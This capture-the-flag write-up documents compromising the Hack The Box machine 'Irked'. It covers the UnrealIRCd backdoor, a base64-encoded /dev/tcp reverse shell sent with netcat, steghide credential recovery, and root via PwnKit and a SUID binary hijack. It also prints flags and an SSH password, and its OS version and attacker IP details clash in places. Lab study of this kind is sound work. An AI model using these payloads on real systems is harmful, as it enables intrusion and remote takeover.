# Irked: Hack The Box

> **Hack The Box | Linux | Easy**  
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux: Debian GNU/Linux 9 (Stretch): 32-bit (i686) |
| **Difficulty** | Easy |
| **Category** | Linux / IRC Backdoor / Steganography / CVE-2021-4034 |
| **IP Address** | 10.129.44.62 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | CVE-2010-2075 (UnrealIRCd 3.2.8.1 backdoor), CVE-2021-4034 (PwnKit) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP scan: 8 open ports including IRC |: |
| 2 | irssi version fingerprint: UnrealIRCd 3.2.8.1 |: |
| 3 | UnrealIRCd backdoor via echo + netcat (manual) | `ircd` |
| 4 | Hidden `.backup` file → steghide password in `irked.jpg` |: |
| 5 | steghide extract → SSH password for `djmardov` | `djmardov` |
| 6 | SUID enumeration → `/usr/bin/pkexec` v0.105 → PwnKit (CVE-2021-4034) | `root` |

> **Architecture note:** This is a 32-bit (i686) Debian system. Exploits compiled on modern 64-bit Kali will fail with format errors or GLIBC mismatches. Full troubleshooting chain documented in the privilege escalation section.

---

## Enumeration

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.44.62 \
  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -sC -sV 10.129.44.62
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.44.62
Host is up (0.22s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open   http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
6697/tcp  open   irc     UnrealIRCd
|_irc-info: Unable to open connection
8067/tcp  open   irc     UnrealIRCd
|_irc-info: Unable to open connection
52735/tcp closed unknown
65534/tcp open   irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 52.43 seconds
```

**Key findings:**

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 6.7p1 | Older Debian version: useful once credentials found |
| 80 | Apache 2.4.10 | Web server: minimal content |
| 111 | rpcbind | RPC services: check NFS mounts |
| 6697 / 8067 / 65534 | UnrealIRCd | Three IRC ports: version fingerprint required |

Three IRC ports stand out immediately. IRC daemons running on non-standard ports strongly suggest a deliberately configured (or misconfigured) service. `UnrealIRCd` version 3.2.8.1 is a known supply chain compromise with an embedded backdoor.

### Web Application: Port 80

```bash
Hackerpatel007_1@htb[/htb]$ curl http://10.129.44.62/
```

The page displays a single angry face emoji image with the caption: **"IRC is almost working!"**

This is a direct hint confirming IRC is the intended attack path. The image (`irked.jpg`) itself will be relevant later for the steganography lateral movement step.

### RPC Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ showmount -e 10.129.44.62
```

```
clnt_create: RPC: Program not registered
```

No NFS shares exposed. Dead end: proceed to IRC.

### IRC Version Fingerprint

Connect to the IRC service to extract the running version:

```bash
Hackerpatel007_1@htb[/htb]$ irssi -c 10.129.44.62 --port 8067
```

```
20:45 Irked.htb *** Looking up your hostname...
20:45 Irked.htb *** Couldn't resolve your hostname; using your IP address instead
20:45 -!- You have not registered
20:45 -!- Welcome to the ROXnet IRC Network root_!root@10.10.15.47
20:45 -!- Your host is irked.htb, running version Unreal3.2.8.1
20:45 -!- This server was created Mon May 14 2018 at 13:12:50 EDT
```

**Version confirmed: `Unreal3.2.8.1`**

---

## Foothold: UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)

### Vulnerability Background

In November 2009, the UnrealIRCd project discovered that the source code distributed on their download servers had been trojaned. An attacker modified `src/s_bsd.c` to include a backdoor that processes commands prefixed with the string `AB;`. Any data sent to the IRC port beginning with `AB;` is passed directly to `system()` and executed as the `ircd` user: with no authentication required.

The backdoor was present in `Unreal3.2.8.1.tar.gz` distributed between November 2009 and June 2010. The machine is intentionally running this compromised version.

**Trigger mechanism:**

```
echo 'AB; <command>' | nc <target> <irc_port>
```

### Method 1: Manual Exploitation via echo + netcat (No Metasploit)

This is the OSCP-compliant path. The backdoor requires no exploit code: just netcat and the correct prefix.

**Step 1: Verify RCE with ping test:**

Start tcpdump to catch incoming ICMP:

```bash
Hackerpatel007_1@htb[/htb]$ sudo tcpdump -i tun0 icmp
```

In a second terminal, trigger the backdoor:

```bash
Hackerpatel007_1@htb[/htb]$ echo 'AB; ping -c 2 10.10.16.236' | nc 10.129.44.62 65534
```

```
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
17:17:38.728887 IP irked.htb > 10.10.16.236: ICMP echo request, seq 1, length 64
17:17:38.728930 IP 10.10.16.236 > irked.htb: ICMP echo reply, seq 1, length 64
17:17:39.688576 IP irked.htb > 10.10.16.236: ICMP echo request, seq 2, length 64
17:17:39.688643 IP 10.10.16.236 > irked.htb: ICMP echo reply, seq 2, length 64
```

RCE confirmed: the server pings back.

**Step 2: Reverse shell via base64-encoded payload:**

Direct `bash -i` in the `AB;` prefix may fail due to special character handling. Encode the reverse shell in base64 to avoid interpretation issues:

```bash
Hackerpatel007_1@htb[/htb]$ echo 'bash -i >& /dev/tcp/10.10.16.236/4444 0>&1' | base64
```

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMzYvNDQ0NCAwPiYxCg==
```

Start the listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

Trigger the backdoor with the base64 payload:

```bash
Hackerpatel007_1@htb[/htb]$ echo 'AB; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMzYvNDQ0NCAwPiYxCg== | base64 -d | bash' \
  | nc 10.129.44.62 65534
```

```
Ncat: Connection from 10.129.44.62.
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

Shell received as `ircd`.

### Method 2: Metasploit Module (Documented Reference)

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.129.44.62
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 65534
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
```

```
[*] Started reverse TCP double handler on 10.10.16.236:4444
[*] 10.129.44.62:65534 - Connected to 10.129.44.62:65534...
[*] 10.129.44.62:65534 - Sending backdoor command...
[*] Command shell session 1 opened (10.10.16.236:4444 -> 10.129.44.62:44183)

whoami
ircd
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

### TTY Upgrade

```bash
ircd@irked:~/Unreal3.2$ python -c 'import pty; pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$
```

> Python 3 is not available on this Debian 8 install. Use `python` (python2).

---

## Lateral Movement: ircd → djmardov (Steganography)

### Step 1: Enumerate Other Users

```bash
ircd@irked:~/Unreal3.2$ ls /home
djmardov

ircd@irked:~/Unreal3.2$ ls -la /home/djmardov/
drwxr-xr-x 16 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x  3 root     root     4096 May 14  2018 ..
drwxr-xr-x  2 djmardov djmardov 4096 May 14  2018 Desktop
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 Documents
drwxr-xr-x  2 djmardov djmardov 4096 May 14  2018 Downloads
...
-rw-r--r--  1 djmardov djmardov   33 May 15  2018 user.txt
```

`user.txt` is owned by `djmardov` and world-readable, but a direct pivot to `djmardov` is needed to SSH cleanly. Enumerate the Documents directory:

### Step 2: Hidden Backup File

```bash
ircd@irked:~/Unreal3.2$ ls -la /home/djmardov/Documents/
```

```
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 16 djmardov djmardov 4096 May 15  2018 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
```

A hidden file `.backup`:

```bash
ircd@irked:~/Unreal3.2$ cat /home/djmardov/Documents/.backup
```

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Two critical pieces of information:

1. The string `steg` = **steganography**: a secret is hidden inside an image file
2. `UPupDOWNdownLRlrBAbaSSss` = the steganography password (a Konami code variant)

The only image seen so far is `irked.jpg` on the web server at port 80.

### Step 3: Extract SSH Password via steghide

Download the image to the attack host:

```bash
Hackerpatel007_1@htb[/htb]$ wget http://10.129.44.62/irked.jpg
```

Extract hidden data using the password from `.backup`:

```bash
Hackerpatel007_1@htb[/htb]$ steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg
```

```
wrote extracted data to "pass.txt".
```

```bash
Hackerpatel007_1@htb[/htb]$ cat pass.txt
```

```
Kab6h+m+bbp2J:HG
```

SSH password for `djmardov`: `Kab6h+m+bbp2J:HG`

### Step 4: SSH as djmardov

```bash
Hackerpatel007_1@htb[/htb]$ ssh djmardov@10.129.44.62
djmardov@10.129.44.62's password: Kab6h+m+bbp2J:HG
```

```
The programs included with the Debian GNU/Linux system are free software;
...
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$
```

```bash
djmardov@irked:~$ cat user.txt
```

```
31e550ae0c446aa8141a6e8f3a6babda
```

---

## Privilege Escalation: djmardov → root

### Step 1: Sudo Enumeration

```bash
djmardov@irked:~$ sudo -l
-bash: sudo: command not found
```

`sudo` is not installed on this Debian system. No sudo escalation path.

### Step 2: Confirm Architecture (Critical First Step)

Before running any exploit, always check architecture:

```bash
djmardov@irked:~$ uname -m
i686
```

**32-bit system.** This is critical: any exploit binary compiled on modern 64-bit Kali will fail immediately.

```bash
djmardov@irked:~$ uname -a
Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux
```

### Step 3: SUID Binary Enumeration

```bash
djmardov@irked:~$ find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

```
-rwsr-xr-- 1 root messagebus  362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root          9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root         13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root        562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root         13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root       1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip         338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root         43576 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail         96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root         78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root         38740 May 17  2017 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon     50644 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root         18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root          9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root         53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root         52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root          7328 May 16  2018 /usr/bin/viewuser
-rwsr-xr-x 1 root root         96760 Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root         38868 May 17  2017 /bin/su
-rwsr-xr-x 1 root root         34684 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root         34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root        161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root         26344 Mar 29  2015 /bin/umount
```

**Two non-standard SUID binaries stand out:**

| Binary | Notes |
|---|---|
| `/usr/bin/pkexec` | PwnKit: version 0.105 = vulnerable to CVE-2021-4034 |
| `/usr/bin/viewuser` | Custom binary: not a standard Debian package. Suspicious. |

### Step 4: pkexec Version Check

```bash
djmardov@irked:~$ /usr/bin/pkexec --version
pkexec version 0.105
```

`polkit 0.105`: confirmed vulnerable to **CVE-2021-4034 (PwnKit)**. Any polkit version below `0.120` is exploitable.

---

## Privilege Escalation: Path A: PwnKit CVE-2021-4034 (Chosen Path)

### CVE-2021-4034 Background

PwnKit is a critical local privilege escalation vulnerability in `pkexec`, the SUID binary in the polkit package. Present in every version since 2009. The vulnerability exploits an `argc=0` condition: when `pkexec` is called without arguments, it reads past the end of the `argv[]` array into `envp[]`, and writes back to that location. This allows an attacker to inject a controlled value into the process environment before the SUID root binary processes it, loading an attacker-controlled shared library (`evil.so`) via `GCONV_PATH` poisoning.

The exploit requires two compiled components:

- `exploit`: the main binary that sets up the `argc=0` call and crafts the environment
- `evil.so`: the malicious shared library that executes as root when loaded

### Step 5: Compile Exploit Components (3-Failure Troubleshooting Chain)

This section documents the full architecture mismatch debugging process: exactly as performed.

**Attempt 1: Transfer 64-bit binary compiled on Kali:**

On attack host (64-bit Kali):

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/arthepsy/CVE-2021-4034.git /tmp/pwnkit
Hackerpatel007_1@htb[/htb]$ cd /tmp/pwnkit
Hackerpatel007_1@htb[/htb]$ gcc cve-2021-4034-poc.c -o exploit
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

```bash
# On target
djmardov@irked:/tmp$ wget http://10.10.16.236:8000/exploit
exploit             100%[=====================>]  15.70K  42.4KB/s
djmardov@irked:/tmp$ chmod +x exploit && ./exploit
bash: ./exploit: cannot execute binary file: Exec format error
```

**Failure 1: Exec Format Error.** The binary was compiled as a 64-bit ELF. The target is i686 (32-bit). The two formats are binary-incompatible.

```bash
djmardov@irked:/tmp$ uname -m
i686
```

Confirmed: target = 32-bit. Exploit must be compiled for i686.

**Attempt 2: Recompile for 32-bit on Kali:**

```bash
# Install 32-bit cross-compilation support on Kali
Hackerpatel007_1@htb[/htb]$ sudo dpkg --add-architecture i386
Hackerpatel007_1@htb[/htb]$ sudo apt update
Hackerpatel007_1@htb[/htb]$ sudo apt install gcc-multilib libc6-dev-i386 -y

# Compile as 32-bit
Hackerpatel007_1@htb[/htb]$ gcc -m32 cve-2021-4034-poc.c -o exploit
Hackerpatel007_1@htb[/htb]$ file exploit
exploit: ELF 32-bit LSB executable, Intel 80386
```

Transfer and run:

```bash
djmardov@irked:/tmp$ wget http://10.10.16.236:8000/exploit
exploit             100%[=====================>]  14.64K  40.4KB/s
djmardov@irked:/tmp$ chmod +x exploit && ./exploit
./exploit: /lib/i386-linux-gnu/i686/cmov/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
```

**Failure 2: GLIBC_2.34 not found.** The 32-bit binary compiled on modern Kali dynamically links against `GLIBC_2.34`. The target runs an old Debian 8 system with a much older glibc. The dynamic linker on the target cannot satisfy the library version requirement.

This is one of the most common failures when transferring compiled exploits to old targets.

**Attempt 3: Compile exploit statically (-static):**

Static compilation bundles the libc into the binary itself, eliminating the dynamic linker dependency:

```bash
Hackerpatel007_1@htb[/htb]$ gcc -m32 -static cve-2021-4034-poc.c -o exploit
Hackerpatel007_1@htb[/htb]$ file exploit
exploit: ELF 32-bit LSB executable, Intel 80386, statically linked
Hackerpatel007_1@htb[/htb]$ ls -lh exploit
-rwxr-xr-x 1 kali kali 731K exploit
```

The binary is now 731KB (vs 15KB dynamic): the entire libc is bundled inside.

Transfer and run:

```bash
djmardov@irked:/tmp$ wget http://10.10.16.236:8000/exploit
exploit             100%[=====================>] 731.12K  248KB/s
djmardov@irked:/tmp$ chmod +x exploit && ./exploit
cp: cannot stat 'evil.so': No such file or directory
GLib: Cannot convert message: Could not open converter from 'UTF-8' to 'ryaagard'
The value for the SHELL variable was not found the /etc/shells file
This incident has been reported.
```

The exploit runs but cannot find `evil.so`: the shared library component was not transferred. The `cp` error reveals the exploit tries to copy `evil.so` from the current directory.

**Step 6: Transfer evil.so:**

On Kali, compile the shared library as 32-bit:

```bash
Hackerpatel007_1@htb[/htb]$ gcc -m32 -shared -fPIC -nostartfiles cve-2021-4034-poc.so.c -o evil.so
```

Transfer to target:

```bash
djmardov@irked:/tmp$ wget http://10.10.16.236:8000/evil.so
evil.so             100%[=====================>]  14.42K  80.1KB/s
```

### Step 7: Execute PwnKit

Both components are now in `/tmp/`:

```bash
djmardov@irked:/tmp$ ls
evil.so  exploit

djmardov@irked:/tmp$ ./exploit
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained via PwnKit.

---

## Flag Collection

### user.txt

```bash
djmardov@irked:~$ cat /home/djmardov/user.txt
```

```
31e550ae0c446aa8141a6e8f3a6babda
```

### root.txt

```bash
# cat /root/root.txt
```

```
0555008db4c9a0648efc00ad51cab859
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `/home/djmardov/user.txt` | `31e550ae0c446aa8141a6e8f3a6babda` |
| **root.txt** | `/root/root.txt` | `0555008db4c9a0648efc00ad51cab859` |

---

## Alternate Privilege Escalation: Path B: viewuser SUID Custom Binary

> This is the intended path from the official HTB walkthrough. Documented here for completeness. The PwnKit path above was used during this run.

### Background

`/usr/bin/viewuser` is a non-standard SUID binary not present in any Debian package. Anything custom with the SUID bit is high-priority. The `ltrace` analysis reveals it calls `system("/tmp/listusers")` after calling `setuid(0)`: meaning it executes `/tmp/listusers` as root.

### Analysis via ltrace

```bash
# From Kali: analyze the binary
Hackerpatel007_1@htb[/htb]$ scp djmardov@10.129.44.62:/usr/bin/viewuser ./viewuser
Hackerpatel007_1@htb[/htb]$ ltrace ./viewuser
```

```
__libc_start_main(...)
puts("This application is being devleoped to set and test user permissions")
puts("It is still being actively developed")
system("who" ...)
setuid(0)                                     = 0
system("/tmp/listusers" ...)
sh: 1: /tmp/listusers: not found
```

`ltrace` confirms the execution chain:

1. Prints a message
2. Runs `who` to show current logins
3. Calls `setuid(0)`: escalates to root
4. Calls `system("/tmp/listusers")`: executes `/tmp/listusers` as root

`/tmp/listusers` doesn't exist, but `/tmp` is world-writable and the path is not quoted or validated.

### Exploitation

```bash
djmardov@irked:~$ printf '/bin/sh' > /tmp/listusers
djmardov@irked:~$ chmod a+x /tmp/listusers
djmardov@irked:~$ /usr/bin/viewuser
```

```
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0       2019-04-22 12:49 (:0)
djmardov pts/0     2019-04-22 12:49 (10.10.16.236)
...
# id
uid=0(root) gid=0(root) groups=0(root),1000(djmardov)
```

Root shell via writable `/tmp/listusers` executed by SUID `viewuser`.

---

## Binary Exploit Troubleshooting: Reference Guide

This machine provided a real-world debugging chain that directly applies to OSCP exam conditions. The complete failure-to-fix progression is documented here for future reference.

### Failure Interpretation Table

| Error | Root Cause | Fix |
|---|---|---|
| `Exec format error` | Architecture mismatch (64-bit binary on 32-bit target) | Compile with `-m32` after installing `gcc-multilib` |
| `GLIBC_X.XX not found` | Binary linked against newer glibc than target has | Compile with `-static` to bundle libc |
| `Permission denied` | Missing execute bit or `noexec` mount | `chmod +x` or use a different writable directory |
| `Segmentation fault` | Kernel or memory layout mismatch | Compile on target, or check kernel version |
| `cannot stat 'evil.so'` | Missing companion file | Transfer all required exploit components |

### Pre-Transfer Checklist

```bash
# 1. Check target architecture before compiling anything
uname -m
# x86_64 = 64-bit | i686/i386 = 32-bit | aarch64 = ARM64

# 2. Check libc version on target
ldd --version

# 3. Check if gcc is available on target
which gcc

# 4. Verify compiled binary type before transfer
file exploit

# 5. Check dynamic dependencies
ldd exploit
```

### Decision Tree

```
Target architecture check (uname -m)
    │
    ├─ x86_64 → compile normally on Kali
    │
    └─ i686/i386 → need 32-bit binary
            │
            ├─ gcc available on target? → upload source, compile on target (best)
            │
            └─ no gcc on target →
                    ├─ try -m32 on Kali (needs gcc-multilib)
                    │       └─ GLIBC mismatch? → add -static
                    └─ static compile: gcc -m32 -static exploit.c -o exploit
```

---

## Full Attack Chain Reference

```
[Recon] nmap -p- → ports 22, 80, 111, 6697, 8067, 65534
    │
    ├─[Web] port 80 → irked.jpg + "IRC is almost working"
    │
    ├─[IRC] irssi → Unreal3.2.8.1 confirmed
    │
    └─[CVE-2010-2075] UnrealIRCd backdoor
            │
            ├─[Method 1 - Manual] echo 'AB; echo <b64> | base64 -d | bash' | nc 10.129.44.62 65534
            └─[Method 2 - Metasploit] exploit/unix/irc/unreal_ircd_3281_backdoor
                    │
                    └─ ircd@irked shell
                            │
                            └─[Enum] /home/djmardov/Documents/.backup → steg pw
                                    │
                                    └─[steghide] extract -p UPupDOWNdownLRlrBAbaSSss irked.jpg
                                            └─ pass.txt → Kab6h+m+bbp2J:HG
                                                    │
                                                    └─[SSH] djmardov@10.129.44.62
                                                            │
                                                            ├─ user.txt → 31e550ae0c446aa8141a6e8f3a6babda
                                                            │
                                                            ├─[SUID] pkexec v0.105 → CVE-2021-4034
                                                            │       ├─ Attempt 1: 64-bit binary → Exec format error
                                                            │       ├─ Attempt 2: -m32 → GLIBC_2.34 not found
                                                            │       └─ Attempt 3: -m32 -static + evil.so → root ✓
                                                            │
                                                            └─[Alt] /usr/bin/viewuser → /tmp/listusers injection → root
                                                                    │
                                                                    └─ root.txt → 0555008db4c9a0648efc00ad51cab859
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -p- --min-rate=1000 -T4 10.129.44.62` | Fast full port discovery |
| `nmap -p22,80,111,6697,8067,65534 -sC -sV 10.129.44.62` | Targeted service scan |
| `showmount -e 10.129.44.62` | Check NFS exports |
| `irssi -c 10.129.44.62 --port 8067` | Connect to IRC + version fingerprint |
| `echo 'bash -i >& /dev/tcp/10.10.16.236/4444 0>&1' \| base64` | Base64 encode reverse shell |
| `echo 'AB; echo <b64> \| base64 -d \| bash' \| nc 10.129.44.62 65534` | UnrealIRCd backdoor trigger |
| `nc -lvnp 4444` | Catch reverse shell |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to PTY (python2 on Debian 8) |
| `cat /home/djmardov/Documents/.backup` | Read steghide password |
| `wget http://10.129.44.62/irked.jpg` | Download image for steg extraction |
| `steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg` | Extract hidden SSH password |
| `ssh djmardov@10.129.44.62` | SSH with extracted password |
| `uname -m` | **Always check architecture before compiling** |
| `gcc -m32 -static exploit.c -o exploit` | Compile 32-bit static binary on Kali |
| `gcc -m32 -shared -fPIC -nostartfiles evil-so.c -o evil.so` | Compile 32-bit shared library |
| `python3 -m http.server 8000` | Serve files to target |
| `wget http://10.10.16.236:8000/exploit` | Download exploit on target |
| `./exploit` | Execute PwnKit → root |
| `printf '/bin/sh' > /tmp/listusers && chmod a+x /tmp/listusers` | Create malicious listusers |
| `/usr/bin/viewuser` | Trigger SUID viewuser → executes /tmp/listusers as root |

---

## Lessons Learned

**1. Full port scans reveal the real attack surface: default scans miss critical services.**  
nmap's default top-1000 ports would have found ports 22, 80, and 111, but missed the IRC ports on 6697, 8067, and 65534. This machine cannot be solved without finding IRC. `-p-` is mandatory on every HTB machine and every OSCP exam target.

**2. Supply chain attacks don't expire: backdoored binaries stay backdoored forever.**  
UnrealIRCd 3.2.8.1 was backdoored in 2009. Any server running that compiled binary in 2026 is still completely exploitable. Supply chain compromise is not a patching problem: the binary itself must be replaced. This is identical in principle to the PHP 8.1.0-dev backdoor on Knife.

**3. Steganography is a legitimate credential hiding technique: read every page hint.**  
The web page said "IRC is almost working" with an angry face image. The image filename was `irked.jpg`. The `.backup` file said "steg." These are deliberate clues pointing to steganography. On real engagements, embedded data in images is used for data exfiltration: recognising the pattern matters.

**4. Always check architecture before compiling: `uname -m` is the first command.**  
Three successive exploit failures on this machine were all caused by architecture and GLIBC mismatches. The fix order: check `uname -m` → compile with `-m32` → add `-static` if GLIBC mismatches. Internalise this sequence. On OSCP, most exploit failures are environmental, not logical.

**5. `-static` bundles libc but increases binary size significantly.**  
A 15KB dynamic binary became a 731KB static binary. On restricted environments with disk quotas or slow transfer rates, size matters. Always verify `/tmp` is writable and has enough space before transferring large static binaries. An alternative is compiling directly on the target if gcc is present.

**6. Custom SUID binaries are always suspicious: `ltrace` reveals the execution chain.**  
`/usr/bin/viewuser` doesn't exist in any Debian package. The moment a non-standard SUID binary appears in enumeration output, it becomes the primary investigation target. `ltrace` exposed the exact `system("/tmp/listusers")` call that leads to root in two commands.

**7. Debian 8 doesn't have sudo: `sudo` absence is itself information.**  
`sudo: command not found` immediately eliminates the sudo escalation path. The absence of a tool is information: it narrows the attack surface and prevents wasted time. On old Debian systems, focus on SUID binaries, cron jobs, and kernel CVEs.

---

## References

- [CVE-2010-2075: UnrealIRCd Backdoor](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)
- [UnrealIRCd Security Advisory](https://www.unrealircd.org/txt/unrealsecadvisory.20100612.txt)
- [CVE-2021-4034 PwnKit: Qualys Research](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
- [arthepsy PwnKit PoC](https://github.com/arthepsy/CVE-2021-4034)
- [steghide: Steganography Tool](http://steghide.sourceforge.net/)
- [GTFOBins: viewuser pattern: system() abuse](https://gtfobins.github.io/)

---

*HTB Retired Machine: Irked | Completed May 2026 | Flags included per HTB retired machine policy.*
